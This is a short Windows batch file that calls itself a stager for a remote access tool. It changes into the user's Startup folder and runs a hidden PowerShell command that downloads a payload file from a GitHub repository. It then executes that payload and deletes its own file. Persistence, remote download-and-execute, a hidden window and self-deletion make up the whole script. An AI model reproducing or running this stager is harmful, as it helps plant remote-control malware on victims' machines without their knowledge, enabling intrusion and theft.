@echo off
@REM stager for remote access tool

@REM variables  
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move to startup directory
cd %STARTUP%


@REM send email with IP address

@REM write playloads to startup 
echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/wget.cmd -OutFile wget.cmd"


@REM run payload
powershell ./wget.cmd


@REM cd back into initial location
cd "%INITIALPATH%"
del initial.cmd